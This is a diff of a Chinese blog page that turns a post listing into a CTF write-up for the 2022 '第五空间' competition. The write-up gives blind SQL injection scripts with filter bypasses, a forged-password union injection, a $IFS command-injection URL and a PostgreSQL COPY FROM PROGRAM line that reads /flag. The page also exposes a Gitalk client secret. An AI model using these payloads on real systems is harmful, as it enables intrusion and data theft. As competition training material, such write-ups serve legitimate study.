@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
   <head>
       <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title> </title>
+  <title>第五空间 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="  » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="第五空间 |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,9 +25,15 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="第五空间"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/7bmeIZWPa/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
   </head>
   <body>
-     <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
       <a class="navbar-brand" href="https://guokeya.github.io"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
@@ -65,163 +71,136 @@
       </div>
     </div>
   </nav>
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="site-heading">
-            <h1> </h1>
-            <span class="subheading">你与春风皆过客</span>
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>第五空间</h1>
+            <span class="meta">
+            	Posted on
+              2022-09-19，3 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
-      <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/">
-            <h2 class="post-title">
-              Metasploit生成免杀木马
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>环境准备</strong><br>
-1.安装软件如下<br>
-python2.7<br>
-pyinstaller<br>
-pywin32<br>
-32位系统，我这里用的是XP</p>
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>phar略</p>
+<h1 id="5_easylogin">5_easylogin</h1>
+<pre><code>import requests
+flag=&quot;&quot;
+for i in range(1, 1000):
+    min = 30
+    max = 130
+    mid = (min + max)
+    while (min &lt; max):
+        payload = (&quot;admin\xdf'^(ascii(substr((seselectlect group_concat(schema_name) from infoselectrmation_schema.schemata),&quot; + str(i) + &quot;,1))&lt;&quot; + str(mid) + &quot;)#&quot;).replace(&quot; &quot;, &quot;\x09&quot;)
+        #payload=(&quot;admin\xdf'^(ascii(substr((seselectlect group_concat(table_name) from infoselectrmation_schema.tables where table_schema in(database())),&quot;+str(i)+&quot;,1))&lt;&quot;+str(mid)+&quot;)#&quot;).replace(&quot; &quot;,&quot;\x0a&quot;)
+        #payload = (&quot;admin\xdf'^(ascii(substr((seselectlect group_concat(column_name) from infoselectrmation_schema.columns where TABLE_SCHEMA in (database())),&quot; + str(i) + &quot;,1))&lt;&quot; + str(mid) + &quot;)#&quot;).replace(&quot; &quot;, &quot;\x09&quot;)
+        #payload = (&quot;admin\xdf'^(ascii(substr((seselectlect load_file(0x2f666c6167)),&quot; + str(i) + &quot;,1))&lt;&quot; + str(mid) + &quot;)#&quot;).replace(&quot; &quot;, &quot;\x09&quot;)
+        data = {&quot;username&quot;: payload,
+                &quot;password&quot;: &quot;1&quot;}
+        #print(data[&quot;username&quot;].replace(&quot;\x0a&quot;,&quot; &quot;))
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">8 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              Redis RCE 漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Redis 4.x-Redis 5.x 未授权利用</p>
+        res = requests.post(url=&quot;http://39.105.13.61:10808/login.php&quot;, data=data,
+                            proxies={&quot;http&quot;: &quot;http://127.0.0.1:8080/&quot;}).text
+        #print(res)
+        if (&quot;密码不正确&quot; in res):
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Apache Solr &lt; 8.2.0</p>
+            min = mid + 1
+        else:
+            max = mid
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
+        mid = (min + max) // 2
+    flag += chr(mid-1)
+    print(flag)
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/hello-gridea/">
-            <h2 class="post-title">
-              Hello Gridea
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
+</code></pre>
+<p>跑出来密码不对。</p>
+<p>union select都会替换为空。</p>
+<p>构造admin%df'%09uunionnion%09seselectlect%091,2,0x6563636263383765346235636532666532383330386664396632613762616633%23对应password的md5</p>
+<figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/2022919/1663563485326-bb254b77-319e-46b0-9877-a282aeeb91c5.png" alt="image-20220919125806566" loading="lazy"></figure>
+<h1 id="5_web_eeeeasy_sql">5_web_Eeeeasy_SQL</h1>
+<pre><code>import requests
+flag=&quot;0x&quot;
+for a  in range(1,1000):
+    for i in range(30,130):
+        payload=&quot;or(case when (binary username&gt;&quot;+flag+str(hex(i))[2:]+&quot;) then 1 else 9223372036854775807+1 end)#&quot;.replace(&quot; &quot;,&quot;\x09&quot;)
+        #0x473176655f5930755f405f4b33795f37305f3933375f66313467212120       G1ve_Y0u_@_K3y_70_937_f14g!!
+        data={&quot;username&quot;:&quot;1\\&quot;,&quot;password&quot;:payload}
+        res=requests.post(url=&quot;http://39.107.75.148:31945/api/api.php?command=php&quot;,data=data,allow_redirects=False,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text
+        if(res==&quot;&quot;):
+            flag+=str(hex(i-1))[2:]
+            print(str(hex(i)))
+            print(flag)
+            break
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2018-12-12</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
+
+</code></pre>
+<p>跑出来账号密码不对。要多个!和少个s</p>
+<pre><code>Flag_Accoun
+G1ve_Y0u_@_K3y_70_937_f14g!!!
+</code></pre>
+<p><img src="https://c.img.dasctf.com/images/2022919/1663563426248-96c2be1e-ac50-4de1-92f1-79873cc78777.png" alt="image-20220919125659819" loading="lazy">过滤/flag。/proc/self/root/flag绕过</p>
+<h1 id="5_web_letmeguess_1">5_web_letmeguess_1</h1>
+<p>admin admin123</p>
+<pre><code>http://47.94.151.201:12107/index.php?ip=aaa%0ac\d$IFS$9ky\lin%0aca\t$IFS$9*
+</code></pre>
+<h1 id="5_cloudsql">5_cloudsql</h1>
+<pre><code>psql -h39.105.13.61 -p5432 -Uctf -d template1
+ctf
+</code></pre>
+<pre><code>create table s (data text);copy s from program 'cat /flag';select * from s;
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/AN3c3cvtg/">
+              <span class="post-title">
+                2022羊城杯web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/page/21/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
-    <!-- Footer -->
+  </article>
+ <!-- Footer -->
   <footer>
     <div class="container">
       <div class="row">
@@ -301,3 +280,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
